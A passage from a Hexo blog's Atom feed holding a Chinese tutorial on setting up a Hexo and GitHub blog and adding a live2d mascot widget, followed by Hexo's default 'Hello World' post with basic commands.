class="string">&quot;文章标题&quot;</span></span><br></pre></td></tr></table></div></figure><p>如：执行<code>hexo new &quot;My New Post&quot;</code>，会在项目 <code>\Hexo\source\_posts</code> 中生成 My New Post.md 文件，可以进行编辑。</p><p>方法二：也可以在项目 <code>\Hexo\source\_posts</code>下，新建md 文件，然后添加</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">title: 文章标题</span><br><span class="line">date: 时间，如2020-02-02 02:02:02</span><br><span class="line">categories: 类别</span><br><span class="line">tags:  标签</span><br></pre></td></tr></table></div></figure><p>在md文章中添加下面的句子，该句子以上可以显示你想显示的内容。</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- more --&gt;</span><br></pre></td></tr></table></div></figure><p>当我们用编辑器写好文章后，可以使用以下命令将其推送到服务器上</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br><span class="line">$ hexo g -d</span><br></pre></td></tr></table></div></figure>        <h1 id="Hexo主题优化"   >          <a href="#Hexo主题优化" class="heading-link"><i class="fas fa-link"></i></a><a href="#Hexo主题优化" class="headerlink" title="Hexo主题优化"></a>Hexo主题优化</h1>              <h2 id="添加看板娘"   >          <a href="#添加看板娘" class="heading-link"><i class="fas fa-link"></i></a><a href="#添加看板娘" class="headerlink" title="添加看板娘"></a>添加看板娘</h2>      <p>1、安装模块<br>    在hexo根目录执行命令</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d</span><br></pre></td></tr></table></div></figure><p>可以在<code>package.json</code>查看是否安装成功<br><img   src="https://img-blog.csdnimg.cn/20210203145531821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"><br>此时再去 node_moduels目录下，可以看到有如下文件夹，这些都是动画主配置<br><img src="https://img-blog.csdnimg.cn/2021020314565224.png" alt="在这里插入图片描述"></p><p>2、下载模型<br>地址：<span class="exturl"><a class="exturl__link"   href="https://github.com/xiazeyu/live2d-widget-models.git" >https://github.com/xiazeyu/live2d-widget-models.git</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>下载好之后将<code>packages</code>里的所有动画模板拷贝到博客的<code>node_modules</code>目录下</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">live2d-widget-model-chitose</span><br><span class="line">live2d-widget-model-epsilon2_1</span><br><span class="line">live2d-widget-model-gf</span><br><span class="line">live2d-widget-model-haru</span><br><span class="line">live2d-widget-model-haruto</span><br><span class="line">live2d-widget-model-hibiki</span><br><span class="line">live2d-widget-model-hijiki</span><br><span class="line">live2d-widget-model-izumi</span><br><span class="line">live2d-widget-model-koharu</span><br><span class="line">live2d-widget-model-miku</span><br><span class="line">live2d-widget-model-ni-j</span><br><span class="line">live2d-widget-model-nico</span><br><span class="line">live2d-widget-model-nietzsche</span><br><span class="line">live2d-widget-model-nipsilon</span><br><span class="line">live2d-widget-model-nito</span><br><span class="line">live2d-widget-model-shizuku</span><br><span class="line">live2d-widget-model-tororo</span><br><span class="line">live2d-widget-model-tsumiki</span><br><span class="line">live2d-widget-model-unitychan</span><br><span class="line">live2d-widget-model-wanko</span><br><span class="line">live2d-widget-model-z16</span><br></pre></td></tr></table></div></figure><p>也可以挑选自己喜欢的模型，使用命令安装模型，例如：</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install live2d-widget-model-haruto</span><br></pre></td></tr></table></div></figure><p>4.详细配置<br>在Hexo的 _config.yml 文件或主题的 _config.yml 文件中添加配置.</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">live2d:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  pluginModelPath: assets/</span><br><span class="line">  model:</span><br><span class="line">    use: live2d-widget-model-haruto  </span><br><span class="line">    <span class="comment">#模板目录，在node_modules里，这里是模型名称</span></span><br><span class="line">  display:</span><br><span class="line">    position: right</span><br><span class="line">    width: 150 </span><br><span class="line">    height: 300</span><br><span class="line">  mobile:</span><br><span class="line">    show: <span class="literal">false</span>  <span class="comment">#是否在手机进行显示</span></span><br></pre></td></tr></table></div></figure><p><strong>注意：本文所有命令均在git命令行使用</strong></p><p>参考文章：<br><span class="exturl"><a class="exturl__link"   href="https://www.imooc.com/article/313424" >Hexo结合Stun静态博客搭建从入门到入土</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br><span class="exturl"><a class="exturl__link"   href="https://www.jianshu.com/p/3a6342e16e57" >hexo 添加live2d看板动画</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：使用Hexo+github搭建博客&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    
    <category term="搭建博客" scheme="https://swhat.github.io/tags/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://swhat.github.io/2020/02/02/hello-world/"/>
    <id>https://swhat.github.io/2020/02/02/hello-world/</id>
    <published>2020-02-01T18:02:02.000Z</published>
    <updated>2021-02-02T07:11:19.148Z</updated>
    
    <content type="html"><![CDATA[<p>Hello World</p><a id="more"></a><p>Welcome to <span class="exturl"><a class="exturl__link"   href="https://hexo.io/" >Hexo</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>! This is your very first post. Check <span class="exturl"><a class="exturl__link"   href="https://hexo.io/docs/" >documentation</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> for more info. If you get any problems when using Hexo, you can find the answer in <span class="exturl"><a class="exturl__link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> or you can ask me on <span class="exturl"><a class="exturl__link"   href="https://github.com/hexojs/hexo/issues" >GitHub</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>.</p>        <h2 id="Quick-Start"   >          <a href="#Quick-Start" class="heading-link"><i class="fas fa-link"></i></a><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2>              <h3 id="Create-a-new-post"   >          <a href="#Create-a-new-post" class="heading-link"><i class="fas fa-link"></i></a><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3>      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></div></figure><p>More info: <span class="exturl"><a class="exturl__link"   href="https://hexo.io/docs/writing.html" >Writing</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="Run-server"   >          <a href="#Run-server" class="heading-link"><i class="fas fa-link"></i></a><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3>      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></div></figure><p>More info: <span class="exturl"><a class="exturl__link"   href="https://hexo.io/docs/server.html" >Server</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="Generate-static-files"   >          <a href="#Generate-static-files" class="heading-link"><i class="fas fa-link"></i></a><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3>      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></div></figure><p>More info: <span class="exturl"><a class="exturl__link"   href="https://hexo.io/docs/generating.html" >Generating</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="Deploy-to-remote-sites"   >          <a href="#Deploy-to-remote-sites" class="heading-link"><i class="fas fa-link"></i></a><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3>      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></div></figure><p>More info: <span class="exturl"><a class="exturl__link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Hello World&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
</feed>
